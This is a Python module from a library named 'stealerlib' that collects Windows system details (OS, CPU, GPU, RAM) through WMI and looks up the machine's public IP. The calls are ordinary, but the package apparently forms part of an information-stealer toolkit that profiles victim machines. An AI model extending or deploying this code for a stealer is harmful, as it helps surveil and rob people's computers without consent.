#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/system/__init__.py
"""

import re
import os
import wmi
import math
import psutil
import platform
import requests
import subprocess

from typing import Union, Optional

from stealerlib.exceptions import catch

from stealerlib.system.cpu import CPU
from stealerlib.system.mem import Memory
from stealerlib.system.network import Network
from stealerlib.system.types import SystemTypes


def convert_bytes(size: bytes) -> str:
    if not size:
        return "0B"

    sizes = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size, 1024)))
    pow = math.pow(1024, i)
    size = round(size / pow, 2)

    return "%s %s" % (size, sizes[i])


class System(CPU, Memory, Network):
    """This class provides methods for extracting and interacting with system-related information -
       for multiple different operating systems by utilizing psutil and other related packages

    Supported Platforms (from psutil PyPI page):
        Linux
        Windows
        macOS
        FreeBSD, OpenBSD, NetBSD
        Sun Solaris
        AIX
    """

    def __init__(self):
        super(System, self).__init__()

    @catch
    def get_windows_information(self):
        system = wmi.WMI()
        self.comp_info = system.Win32_ComputerSystem()[0]
        self.os_info = osi = system.Win32_OperatingSystem()[0]
        self.proc_info = system.Win32_Processor()[0]
        self.gpu_info = system.Win32_VideoController()[0]

        self.os_name = osi.Name.encode('utf-8').split(b'|')[0]
        self.os_build = osi.BuildNumber
        self.os_version = osi.Version
        self.ram = convert_bytes(float(osi.TotalVisibleMemorySize))

    @catch
    @staticmethod
    def get_ip() -> str:
        ip = requests.get("https://icanhazip.com/").text

        return ip.splitlines()[0]